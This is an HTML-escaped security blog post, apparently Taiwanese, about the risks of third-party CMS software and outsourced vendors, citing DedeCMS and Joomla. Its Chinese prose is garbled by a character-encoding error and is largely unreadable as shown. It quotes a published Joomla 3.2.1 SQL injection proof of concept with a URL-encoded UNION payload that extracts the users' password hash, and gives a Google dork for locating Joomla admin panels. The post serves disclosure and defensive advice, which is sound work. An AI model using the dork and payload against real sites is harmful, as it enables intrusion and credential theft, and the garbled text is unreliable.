&lt;p&gt;&lt;a href=&quot;http://www.dedecms.com/&quot;&gt;DedeCMS&lt;/a&gt; æ˜¯çŸ¥åçš„å…§å®¹ç®¡ç†ç³»çµ±ï¼Œä¸å°‘å…¬å¸æ‹¿æ­¤å¥—ä»¶æ¶è¨­ç¶²ç«™ã€éƒ¨è½æ ¼ç­‰ã€‚ä½†åœ¨é€™å¹¾å€‹æœˆï¼Œåœ¨ã€Œ&lt;a href=&quot;http://wooyun.org&quot;&gt;çƒé›²å¹³å°&lt;/a&gt;ã€ä¸Šé™¸çºŒæœ‰äººæ­éœ² DedeCMS çš„æ¼æ´ã€‚åŒ…æ‹¬å¤§é‡å„ç¨® SQL Injectionã€Cross-Site Scripting å¼±é»ç­‰ç­‰ï¼Œç”šè‡³é‚„åŒ…æ‹¬ Command Execution å•é¡Œã€‚å¦‚æœæ²’æœ‰å³æ™‚ä¿®æ­£é€™äº›å•é¡Œï¼Œå°å‰‡é€ æˆç”¨æˆ¶å¸³è™Ÿè¢«ç›œï¼Œå¤§å‰‡é€ æˆæ•´å°ä¸»æ©Ÿè¢«å…¥ä¾µï¼Œå–å¾—ä½œæ¥­ç³»çµ±æ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot; alt=&quot;çƒé›²æ¼æ´å ±å‘Šå¹³å°&quot; title=&quot;çƒé›²æ¼æ´å ±å‘Šå¹³å°&quot; /&gt;&lt;br /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä»€éº¼ç³»çµ±æ²’è¢«æ‰¾åˆ°æ¼æ´éå‘¢ï¼Ÿæœ‰é‚£éº¼åš´é‡å—ï¼Ÿä½†è©²ç³»çµ±å·²ç¶“ä¸åªä¸€æ¬¡å‡ºç¾é‡å¤§æ¼æ´å°è‡´ä¼æ¥­é­åˆ°å…¥ä¾µï¼Œåœ¨ä»Šå¹´ä¸€äºŒæœˆä»½æ›´æ˜¯é­æ­éœ²å¤šé”åæ•¸å€‹é«˜é¢¨éšª SQL Injection è³‡æ–™åº«æ³¨å…¥æ¼æ´ã€‚æ­¤ç¾è±¡å‡¸é¡¯è©²å¥—ä»¶çš„è¨­è¨ˆä¸¦æœªç¶“éå®‰å…¨æ¸¬è©¦ï¼Œä¸¦ä¸”æ¡ç”¨ä¸å®‰å…¨çš„ç¨‹å¼æ’°å¯«æ–¹å¼ï¼Œæœªä¾†å¯èƒ½æœƒæœ‰æ›´å¤šéš±å«çš„æ¼æ´é‡‹å‡ºã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot; alt=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; title=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å¹³å°ä¸­æœå°‹é—œéµå­—ã€ŒDedeCMSã€ï¼Œæœƒç™¼ç¾æ¼æ´æå ±çš„æ¬¡æ•¸ç›¸ç•¶å¤šï¼Œåœ¨æ¼æ´çš„è©•è«–ä¸­ä¹Ÿæœ‰ä¸å°‘æŠ€è¡“äººå“¡é€²è¡Œè¨è«–ã€‚ä½†æ›´å¤šçš„ç–‘æƒ‘æ˜¯ç‚ºä»€éº¼ DedeCMS æœƒä¸€å†çš„ç™¼ç”Ÿè³‡å®‰å•é¡Œã€‚ä¾‹å¦‚ä»¥ä¸‹æ¼æ´ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-052010&quot;&gt;DedecmsæŸå‘½ä»¤åŸ·è¡Œæ¼æ´&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051950&quot;&gt;DedeCMSå…¨ç‰ˆæœ¬é€šæ®ºSQLæ³¨å…¥(çœŸæ­£çš„ç„¡ä»»ä½•é™åˆ¶é™„å®˜æ–¹æ¸¬è©¦çµæœ)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051889&quot;&gt;DedeCMSå…¨ç‰ˆæœ¬é€šæ®ºSQLæ³¨å…¥(ç„¡ä»»ä½•é™åˆ¶)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-052792&quot;&gt;DedecmsæŸå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆç»­ï¼‰&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot; alt=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; title=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;è€Œæ–¼å¦ä¸€å€‹ã€Œ&lt;a href=&quot;http://sebug.net&quot;&gt;Sebug å®‰å…¨æ¼æ´ä¿¡æ¯åº«&lt;/a&gt;ã€ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸å°‘ DedeCMS çš„è¹¤å½±ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot; alt=&quot;sebugå®‰å…¨æ¼æ´ä¿¡æ¯åº«&quot; title=&quot;sebugå®‰å…¨æ¼æ´ä¿¡æ¯åº«&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœå®˜æ–¹åœ¨ç¬¬ä¸€æ™‚é–“å°±èƒ½æ¥ç²é€šå ±ã€äº†è§£å•é¡Œä¸¦ä¿®æ­£è§£æ±ºï¼Œæä¾›æ›´æ–°ç¨‹å¼çµ¦å®¢æˆ¶æ›´æ–°ï¼Œé‚£å®‰å…¨çš„é¢¨éšªæœƒå°äº›ã€‚ä½†åœ¨å®˜æ–¹å°šæœªé‡‹å‡ºæ›´æ–°çš„é€™æ®µæ™‚é–“ï¼Œç¶²ç«™å°‡å®Œå…¨çš„æš´éœ²åœ¨é¢¨éšªç•¶ä¸­ã€‚æœ‰å¿ƒäººå£«çœ‹åˆ°å¥—ä»¶çš„æ¼æ´é™¸çºŒè¢«æ­éœ²ï¼Œä¹Ÿæœƒæ›´æœ‰èˆˆè¶£å°‹æ‰¾ä½¿ç”¨è©²å¥—ä»¶çš„ç¶²ç«™æ”»æ“Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹èªªæ˜joomla&quot;&gt;æ¡ˆä¾‹èªªæ˜ï¼šJoomla!&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt; æ˜¯å¦ä¸€å¥—åœ‹éš›éå¸¸çŸ¥åçš„ CMS ç³»çµ±ï¼Œå› ç‚ºå…¶ä¾¿åˆ©æ€§ï¼Œå¾ˆå¤šä¼æ¥­ã€å­¸æ ¡ã€æ”¿åºœå–®ä½ï¼Œéƒ½æ¡ç”¨æ­¤å¥—ä»¶å»ºç«‹ç¶²ç«™ã€‚é€é Google Hacking æ–¹å¼å¯ä»¥æ‰¾åˆ°å°ç£éå¸¸å¤šç¶²ç«™éƒ½ä½¿ç”¨ Joomla! æ¶ç«™ã€‚&lt;/p&gt;

&lt;pre&gt;
site:tw intitle:ç®¡ç†å€ inurl:administrator
&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking å°‹æ‰¾ Joomla!&quot; title=&quot;Google Hacking å°‹æ‰¾ Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯å¦‚æœä»Šå¤©é€™å€‹ç³»çµ±å‡ºäº†å•é¡Œå‘¢ï¼Ÿã€ŒJoomla!ã€å› ç‚ºå¤–æ›ã€å¥—ä»¶çœ¾å¤šï¼Œä¹Ÿç¶“å¸¸æˆç‚ºæ¼æ´ç™¼æ˜çš„å°è±¡ã€‚åœ¨ 2014/02/05ï¼Œåœ‹å¤–é‡‹å‡ºäº†ä¸€å€‹ SQL Injection Exploitï¼Œå¯ä»¥å°è‡´ç¶²ç«™å¸³è™Ÿå¯†ç¢¼ç›´æ¥è¢«å°å‡ºã€‚&lt;/p&gt;

&lt;p&gt;å®˜æ–¹å®‰å…¨å…¬å‘Šï¼š&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Secunia: Joomla! Multiple Vulnerabilities &lt;a href=&quot;http://secunia.com/advisories/56772/&quot;&gt;http://secunia.com/advisories/56772/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploit ä½å€ï¼š&lt;a href=&quot;http://www.exploit-db.com/exploits/31459/&quot;&gt;http://www.exploit-db.com/exploits/31459/&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;# Exploit Title: Joomla 3.2.1 sql injection
# Date: 05/02/2014
# Exploit Author: kiall-9@mail.com
# Vendor Homepage: http://www.joomla.org/
# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
# Version: 3.2.1 (default installation with Test sample data)
# Tested on: Virtualbox (debian) + apache
POC=&amp;gt;
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
Â 
will cause an error:
Â 
1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;\)&amp;#39; at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = &amp;#39;com_weblinks.categories&amp;#39; AND `m`.`content_item_id` IN ( \) Array ( [type] =&amp;gt; 8 [message] =&amp;gt; Undefined offset: 0 [file] =&amp;gt; /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] =&amp;gt; 203 )
Â 
I modified the original error.php file with this code --- &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php print_r(error_get_last()); ?&amp;gt;&lt;/span&gt; --- in order to obtain something useful. ;-)
Â 
Now i can easily exploit this flaw:
Â 
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
and obtain the hash:
Â 
1054 Unknown column &amp;#39;$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1&amp;#39; in &amp;#39;where clause&amp;#39; SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&amp;gt; 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&amp;gt; &amp;#39;com_weblinks.categories&amp;#39;) AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 5
Â 
CheerZ&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å€¼å¾—æ³¨æ„ä¸€çœ‹çš„æ˜¯&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;å®˜æ–¹å…¬å‘Š&lt;/a&gt;ï¼Œä¸Šé¢æ¨™è¨»è‘—æ¼æ´å›å ±æ™‚é–“ä»¥åŠä¿®è£œæ™‚é–“ã€‚2014/2/6 æ¥ç²å›å ±ï¼Œ2014/3/6 ä¿®å¾©ã€‚åœ¨é€™æ•´æ•´ä¸€å€‹æœˆçš„æ™‚é–“ä¹‹å…§ï¼Œæ‰€æœ‰é©ç”¨ç‰ˆæœ¬å…§çš„ Joomla! ç¶²ç«™éƒ½å°‡å—æ­¤æ¼æ´å½±éŸ¿ã€‚å› æ­¤å¥—ä»¶å» å•†çš„åæ‡‰ä¿®å¾©é€Ÿåº¦è¶Šæ…¢ï¼Œé¡§å®¢æš´éœ²åœ¨é¢¨éšªä¹‹ä¸­çš„æ™‚é–“è¶Šé•·ã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Project: Joomla!
SubProject: CMS
Severity: High
Versions: 3.1.0 through 3.2.2
Exploit type: SQL Injection
Reported Date: 2014-February-06
Fixed Date: 2014-March-06
CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹èªªæ˜å¤–åŒ…å» å•†&quot;&gt;æ¡ˆä¾‹èªªæ˜ï¼šå¤–åŒ…å» å•†&lt;/h3&gt;

&lt;iframe src=&quot;//embed.gettyimages.com/embed/147456329?et=tHsuT-4nxk-4NvmLZycwCA&amp;amp;sig=Z5X7iFr5V9vS70tCT49wQA8EldpRXSuV3jpoBtgTmg4=&quot; width=&quot;507&quot; height=&quot;406&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt; &lt;/iframe&gt;

&lt;p&gt;é€™æ¨£çš„æƒ…å¢ƒä½ æ˜¯å¦ç†Ÿæ‚‰ï¼Ÿ&lt;/p&gt;

&lt;p&gt;å…¬å¸æœ‰ä¸€å¥—å®¢è£½åŒ–çš„ç³»çµ±éœ€è¦å»ºç½®ï¼Œä½†æ˜¯å› ç‚ºå…¬å¸å…§éƒ¨é–‹ç™¼äººå“¡ä¸è¶³ï¼Œå› æ­¤æŠŠé€™å€‹ç³»çµ±å¤–åŒ…å‡ºå»çµ¦å» å•†åšã€‚è²¨æ¯”ä¸‰å®¶ä¸åƒè™§ï¼Œæ¯”äº† A B C ä¸‰å®¶ï¼Œç™¼ç¾ A å®¶æœ€ä¾¿å®œå¯¦æƒ ï¼Œäº¤è²¨æ™‚é–“åˆçŸ­ã€‚æ±ºå®šå°±æŠŠé€™å€‹ç³»çµ±ç™¼åŒ…çµ¦ A å» å•†åšã€‚åŠå¹´éå»äº†ï¼Œé€™å€‹å» å•†é †åˆ©äº¤è²¨çµæ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;ä¸€å¹´éå¾Œï¼Œç™¼ç¾é€™å€‹ç³»çµ±ç«Ÿç„¶é­åˆ°å…¥ä¾µï¼Œä¸»å‹•æ”»æ“Šå…§éƒ¨å…¶ä»–ä¼ºæœå™¨ã€‚ã€Œä¸æ˜¯æœ‰è²·é˜²ç«ç‰†å—ï¼Ÿæ€éº¼é‚„æœƒè¢«å…¥ä¾µï¼Ÿã€è€é—†èªªã€‚é€™å¯åš´é‡äº†ï¼Œé¦¬ä¸Šæ‰¾å» å•†ä¾†åˆ®ä¸€é “ã€‚æ²’æƒ³åˆ°ï¼ŒA å» å•†è¡¨ç¤ºï¼Œè©²æ¡ˆå·²ç¶“é †åˆ©çµæ¡ˆï¼Œç¶­è­·æœŸä¹Ÿå·²ç¶“éäº†ï¼Œæ²’è¾¦æ³•æä¾›å”åŠ©ï¼Œé™¤éç¹¼çºŒç°½è¨‚ç¶­è­·åˆç´„ã€‚å•é¡Œç¸½å¾—è§£æ±ºï¼Œç°½è¨‚äº†ç¶­è­·åˆç´„ä¹‹å¾Œï¼ŒA å» å•†ä¹Ÿå”åŠ©æŠŠç—…æ¯’ç æ‰äº†ã€‚åœ“æ»¿çµæŸï¼Ÿäº‹æƒ…æœ‰é‚£éº¼ç°¡å–®å—ï¼Ÿ&lt;/p&gt;

&lt;p&gt;éäº†å…©å¤©ï¼Œç³»çµ±åˆé–‹å§‹æ”»æ“Šå…¶ä»–ä¼ºæœå™¨ã€‚ã€Œç—…æ¯’ä¸æ˜¯å·²ç¶“ç æ‰äº†å—ï¼Ÿã€è€é—†èªªã€‚å•é¡Œåœ¨å“ªå¤§å®¶æ‡‰è©²éƒ½å¾ˆæ¸…æ¥šã€‚åœ¨å°‹æ‰¾è³‡å®‰å» å•†å”åŠ©ä¹‹ä¸‹ï¼Œç™¼ç¾ä¸»æ©Ÿæ˜¯å› ç‚º A å» å•†è¨­è¨ˆçš„ç³»çµ±å«æœ‰æ¼æ´ï¼Œå°è‡´ SQL Injection å•é¡Œï¼Œé­æ”»æ“Šè€…åˆ©ç”¨æ¤å…¥æƒ¡æ„ç¨‹å¼ã€‚A å» å•†ç™¾èˆ¬ç„¡å¥ˆï¼Œæ‘¸æ‘¸é¼»å­æŠŠé€™å€‹æ¼æ´ä¿®è£œèµ·ä¾†ã€‚åˆéäº†å…©å¤©ï¼Œå†åº¦é­åˆ°å…¥ä¾µã€‚çœ‹äº†çœ‹ï¼Œç™¼ç¾åˆæ˜¯å¦ä¸€å€‹ SQL Injection å•é¡Œã€‚åœ¨å¹¾æ¬¡èˆ‡æ”»æ“Šè€…çš„ä¸æ–·è§’åŠ›ä¹‹ä¸‹ï¼Œçµ‚æ–¼å¥½åƒæŠŠå•é¡Œéƒ½ä¿®å®Œäº†ã€‚&lt;/p&gt;

&lt;p&gt;éäº†ä¸€é€±ï¼Œç³»çµ±å†åº¦æœ‰æƒ¡æ„ç¨‹å¼çš„è¹¤è·¡ï¼ŒA å» å•†ä¹Ÿç„¡èƒ½ç‚ºåŠ›ã€‚è³‡å®‰å» å•†è¡¨ç¤ºï¼Œè²·é€™å€‹å°±å°äº†ï¼åœ¨é™¸çºŒè¢«è¿«è²·äº†é˜²ç«ç‰†ã€WAFã€IDS ç­‰è¨­å‚™å¾Œï¼Œé›–ç„¶å•é¡Œè²Œä¼¼æ”¹å–„ï¼Œä½†ç³»çµ±ä»ç„¶é›¶æ˜Ÿæœ‰å…¥ä¾µäº‹ä»¶ç™¼ç”Ÿã€‚å…¬å¸åªå¥½ã€Œæ–·ç„¶è™•ç½®ã€ï¼Œç­‰å¾…ä¸‹æ¬¡é ç®—ï¼Œå¦è«‹å» å•†é‡æ–°é–‹ç™¼ç³»çµ±ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 1ï¼šè©²ç³»çµ±æ˜¯å¦é‚„æœ‰å…¶ä»–æ¼æ´ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 2ï¼šå…¬å¸çš„è™•ç½®æ˜¯å¦æ­£ç¢ºï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 3ï¼šA å» å•†çš„å…¶ä»–å®¢æˆ¶æ˜¯å¦æœ‰é¡ä¼¼çš„å•é¡Œï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 4ï¼šä¸æ˜¯æœ‰è²·è³‡å®‰è¨­å‚™ï¼Ÿç‚ºä»€éº¼é‚„æœƒæœ‰è³‡å®‰äº‹ä»¶ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 5ï¼šå…¬å¸è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 6ï¼šå» å•†è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æƒ³ä¸€ä¸‹ä»¥ä¸Šå„é»å•é¡Œã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 1ï¼šè©²ç³»çµ±æ˜¯å¦é‚„æœ‰å…¶ä»–æ¼æ´ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦‚æœä¸€å€‹åœ¨é–‹ç™¼æ™‚æœŸå°±æ²’æœ‰æ³¨æ„å®‰å…¨çš„ç³»çµ±ï¼Œå¾ˆæœ‰å¯èƒ½æœ‰æ›´å¤šä¸ç‚ºäººçŸ¥çš„æ¼æ´ã€‚å¦‚æœè¢«å‹•ä¾è³´è³‡å®‰äº‹ä»¶ï¼Œç™¼ç”Ÿä¸€ä»¶ä¿®ä¸€å€‹æ¼æ´ï¼Œé‚£æ˜¯æ°¸ç„¡æ­¢ç›¡çš„ã€‚æ­£ç¢ºçš„æ–¹å¼æ‡‰è©²æ˜¯ç›´æ¥é‡å° A å» å•†çš„åŸå§‹ç¢¼é€²è¡Œé»‘ç®±&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;ã€ç™½ç®±æºç¢¼æª¢æ¸¬ (Code Review)ï¼Œæ‰èƒ½å¿«é€Ÿæ‰¾å‡ºæ‰€æœ‰é¢¨éšªã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 2ï¼šå…¬å¸çš„è™•ç½®æ˜¯å¦æ­£ç¢ºï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ã€Œè²¨æ¯”ä¸‰å®¶ä¸åƒè™§ã€ï¼Œç¯€å„‰ç¢ºå¯¦æ˜¯ç¾å¾·ï¼Œä½†æ˜¯åœ¨è³‡è¨Šç”¢æ¥­ä¸­ï¼Œè¶Šä¾¿å®œçš„ç³»çµ±å¯èƒ½ä»£è¡¨è‘—æ›´å¤šçš„ cost downï¼Œé™¤äº†çŠ§ç‰²æ‰å“è³ªä¹‹å¤–ï¼Œå¯èƒ½å¸¶çµ¦ä¼æ¥­æ›´å¤šæå¤±ã€‚åœ¨è³‡å®‰äº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œä¸€å®šè¦æ‰¾åŸæœ¬ç¶­é‹å» å•†è² è²¬ï¼Œä¸¦ä¸”èˆ‡è³‡å®‰é¡§å•å…¬å¸é…åˆï¼Œå”åŠ©å» å•†æŠŠå•é¡Œè§£æ±ºã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 3ï¼šA å» å•†çš„å…¶ä»–å®¢æˆ¶æ˜¯å¦æœ‰é¡ä¼¼çš„å•é¡Œï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç¾…é¦¬ä¸æ˜¯ä¸€æ—¥é€ æˆçš„ï¼Œä¸å®‰å…¨çš„ç³»çµ±ä¹Ÿä¸æ˜¯ä¸€å€‹æ¼æ´é€ æˆçš„ã€‚å» å•†é€šå¸¸æ˜¯åšå‡ºä¸€ä»½ç³»çµ±ï¼Œå®¢è£½åŒ–è²©è³£çµ¦ä¸åŒçš„ä¼æ¥­ç”¨æˆ¶ã€‚å¦‚æœåœ¨å»ºç½®çš„éç¨‹ä¸­æ²’æœ‰æ³¨æ„å®‰å…¨å•é¡Œï¼Œä»Šå¤©é€™å®¶å®¢æˆ¶æœ‰é€™å€‹æ¼æ´ï¼Œåˆ¥çš„å®¢æˆ¶ä¸€å®šä¹Ÿæœƒæœ‰ã€‚å› æ­¤å¦‚æœæ¡ç”¨äº†ä¸è‰¯çš„å» å•†å¯¦ä½œçš„ç³»çµ±ï¼Œä¸‹ä¸€å€‹è¢«é§­çš„å¯èƒ½å°±æ˜¯è‡ªå·±ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 4ï¼šä¸æ˜¯æœ‰è²·è³‡å®‰è¨­å‚™ï¼Ÿç‚ºä»€éº¼é‚„æœƒæœ‰è³‡å®‰äº‹ä»¶ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ã€Œä¸æ˜¯æœ‰è²·é˜²ç«ç‰†å—ï¼Ÿæ€éº¼é‚„æœƒè¢«å…¥ä¾µï¼Ÿã€æ˜¯å¾ˆå¤šå‚³çµ±æ€ç¶­ä¼æ¥­çš„å…±åŒå¿ƒè²ã€‚é˜²ç«ç‰†ä¸æ˜¯è¬éˆä¸¹ï¼Œé§­å®¢ä¹Ÿçµ•å°ä¸æ˜¯é›»è…¦ã€‚ä¸¦ä¸æ˜¯å®Œå…¨ä¾è³´è³‡å®‰è¨­å‚™å°±èƒ½å¤ é¿å…è³‡å®‰å•é¡Œã€‚åœ¨é§­å®¢çš„æ‰‹æ³•ä¸­ï¼Œæ›´å¤šæ˜¯å¦‚ä½•ç¹éå„ç¨®é˜²ç¦¦è¨­å‚™æ‰‹æ®µï¼Œç”šè‡³æœ‰äº›è³‡å®‰è¨­å‚™æœ¬èº«ç«Ÿç„¶å«æœ‰è³‡å®‰å¼±é»ï¼Œä¼æ¥­åè€Œå› ç‚ºè³‡å®‰è¨­å‚™å°è‡´ç³»çµ±è¢«å…¥ä¾µã€‚&lt;/p&gt;

&lt;p&gt;æ­£ç¢ºçš„æ€ç¶­æ‡‰è©²æ˜¯å¾äººé–‹å§‹åšèµ·ï¼Œå»ºç«‹æ­£ç¢ºçš„è³‡å®‰è§€å¿µã€è³‡å®‰æ€ç¶­ï¼Œå­¸ç¿’é§­å®¢çš„æ€ç¶­ã€‚å»ºç«‹æ­£ç¢ºçš„ç³»çµ±é–‹ç™¼æµç¨‹ã€å»ºç«‹æ­£ç¢ºçš„è³‡å®‰äº‹ä»¶è™•ç†æµç¨‹ã€‚å°‹æ‰¾ä¿¡è­½è‰¯å¥½çš„è³‡å®‰é¡§å•å» å•†ï¼Œå®šæœŸé‡å°ä¼æ¥­å…§éƒ¨å„ç³»çµ±é€²è¡Œæ»²é€æ¸¬è©¦ã€å¼±é»æƒæã€‚å®‰å…¨çš„å»ºç«‹çµ•éä¸€è¹´å¯åŠï¼Œå”¯æœ‰ä¸€æ­¥æ­¥è¸ç©©æ‰èƒ½èµ°å¾—æ›´é ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 5ï¼šå…¬å¸è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 6ï¼šå» å•†è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è«‹çœ‹ä¸‹ä¸€å€‹ç« ç¯€ã€Œå»ºè­°å°ç­–ã€ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å»ºè­°å°ç­–&quot;&gt;å»ºè­°å°ç­–&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/26604430@N05/5895021311/&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_cover.png&quot; alt=&quot;Countermeasure&quot; title=&quot;Countermeasure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¸€å€‹å®‰å…¨çš„ç³»çµ±ï¼Œçµ•å°æ˜¯ç”±åŸºç¤å»ºè¨­é–‹å§‹ï¼Œæ¯å€‹ç’°ç¯€éƒ½å…¼é¡§åˆ°å®‰å…¨çš„è¨­è¨ˆï¼Œä¸¦ä¸”å®šæœŸç¨½æ ¸ç¨‹å¼ç¢¼å®‰å…¨ï¼Œä½¿ç”¨æ­£ç¢ºå®‰å…¨çš„æ–¹å¼é–‹ç™¼ã€‚å¦‚æœç³»çµ±é–‹ç™¼åˆæœŸå°±æ²’æœ‰å…¼é¡§å®‰å…¨ï¼Œå¾ŒæœŸä¸ç®¡æ€éº¼ä¿®è£œï¼Œéƒ½é‚„æ˜¯æœƒæœ‰æ¼æ´è®“æ”»æ“Šè€…æœ‰æ©Ÿå¯è¶ã€‚&lt;/p&gt;

